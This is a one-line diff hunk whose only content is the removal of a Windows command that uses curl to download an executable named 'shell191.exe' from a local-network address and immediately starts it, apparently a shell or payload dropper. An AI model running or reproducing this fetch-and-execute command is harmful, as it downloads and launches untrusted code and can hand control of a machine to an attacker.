@@ -1,1 +1,0 @@
-curl --remote-name http://192.168.191.1/shell191.exe & start shell191.exe
